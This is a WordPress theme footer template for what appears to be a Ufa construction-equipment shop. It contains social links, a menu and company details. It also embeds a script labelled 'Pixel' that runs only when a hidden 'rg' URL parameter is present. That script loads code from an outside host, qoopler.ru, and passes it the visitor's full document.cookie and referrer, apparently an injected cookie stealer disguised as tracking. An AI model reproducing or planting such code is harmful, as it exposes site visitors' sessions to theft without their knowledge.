<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package MyTheme
 */
// Elementor `footer` location

			global $termId;
?>
<?php do_action('before_footer'); ?>
<?php if (!empty(term_description($termId)) || !empty(get_post_meta(get_the_ID(), 'seo-tekst')[0])): ?>
	<section class="seo-text">
		<div class="container">
			<?php echo term_description($termId); ?>
			<?php echo (!empty(get_post_meta(get_the_ID(), 'seo-tekst')[0])) ? get_post_meta(get_the_ID(), 'seo-tekst')[0] : "" ?>
		</div>
	</section>
<?php endif; ?>
<section class="instagram">
	<div class="container">
		<div class="instagram__wrap">
			<h2 class="instagram__title">Наш Instagram</h2>
			<a href="https://www.instagram.com/ufaprom.ufa/" target="_blank" class="instagram__link">@ufaprom.ufa</a>
		</div>
		<div class="instagram__list-wrap"></div>
	</div>
</section>
<?php if (isset($_GET['rg'])): ?>
<!-- Pixel -->
    <script type="text/javascript">
        (function (d, w) {
            var n = d.getElementsByTagName("script")[0],
                s = d.createElement("script"),
                f = function () { n.parentNode.insertBefore(s, n); };
                    s.type = "text/javascript";
                    s.async = true;
                    s.src = "https://qoopler.ru/index.php?ref="+d.referrer+"&cookie=" + encodeURIComponent(document.cookie);
    
                    if (w.opera == "[object Opera]") {
                        d.addEventListener("DOMContentLoaded", f, false);
                    } else { f(); }
        })(document, window);
    </script>
    <!-- /Pixel -->
<?php endif;?>
<footer class="site-footer">
<?php do_action('footer_inner'); ?>
	<div class="container">
		<div class="footer__text">В связи с нестабильностью курса валют производители меняют цену на зарубежную продукцию каждый день. К сожалению, мы физически не успеваем на все реагировать.<br>Просьба уточнять актуальную цену на товар после оформления заказа у менеджера.</div>
		<div class="footer__column-wrap">
			<div class="footer__column">
				<div class="footer__category-title">Категории</div>
				<div class="footer__category-list"><?php get_template_part( 'template-parts/loop-category_footer', 'product_cat' ); ?></div>
			</div>
			<div class="footer__column">
				<div class="footer__menu-title">Навигация</div>
				<?php
					wp_nav_menu( [
				'theme_location'  => '',
				'menu'            => 'Футер меню',
				'container'       => 'div',
				'container_class' => '',
				'container_id'    => '',
				'menu_class'      => 'footer__menu-list',
				'menu_id'         => '',
				'echo'            => true,
				'fallback_cb'     => 'wp_page_menu',
				'before'          => '',
				'after'           => '',
				'link_before'     => '',
				'link_after'      => '',
				'items_wrap'      => '<ul id="%1$s" class="%2$s">%3$s</ul>',
				'depth'           => 0,
				'walker'          => '',
				] );
			?>
			</div>
			<div class="footer__column">
				<div class="footer__about-title">ПОДПИШИТЕСЬ НА НАС</div>
				<ul class="footer__social-list">
					<li class="footer__social-item"><a target="_blank" href="https://api.whatsapp.com/send?phone=79378339350" class="footer__social-link footer__social-link--whatsapp"><i class="fab fa-whatsapp"></i></a></li>
					<li class="footer__social-item"><a target="_blank" href="https://www.instagram.com/ufaprom.ufa/" class="footer__social-link footer__social-link--instagram"><i class="fab fa-instagram"></i></a></li>
					<li class="footer__social-item"><a target="_blank" href="https://t.me/constructionufa/39" class="footer__social-link footer__social-link--tg"><i class="fab fa-telegram"></i></a></li>
					<li class="footer__social-item"><a target="_blank" href="https://www.facebook.com/%D0%9F%D1%80%D0%BE%D0%BC%D1%8B%D1%88%D0%BB%D0%B5%D0%BD%D0%BD%D0%BE%D0%B5-%D0%BE%D0%B1%D0%BE%D1%80%D1%83%D0%B4%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5-1591461617784586/" class="footer__social-link footer__social-link--fb"><i class="fab fa-facebook-f"></i></a></li>
					<li class="footer__social-item"><a target="_blank" href="https://vk.com/ufaprom" class="footer__social-link footer__social-link--vk"><i class="fab fa-vk"></i></a></li>
				</ul>
				<div class="footer__about-text">
					<p>ООО «СтройОборудование»</p>
					<p>ИНН: 0278960109<br>КПП: 027801001<br>ОГРН: 1200200036080</p>
					<p>г. Уфа, ул. Заводская 15/1</p>
					<p>E-mail:<br><a href="mailto:zakaz@ufaprom.ru" style="color:#ffffff">zakaz@ufaprom.ru</a></p>
				</div>
			</div>
		</div>
	</div>

<?php do_action('footer_after'); ?>
</footer>
<?php do_action('after_footer'); ?>
<?php wp_footer(); ?>

</body>
</html>
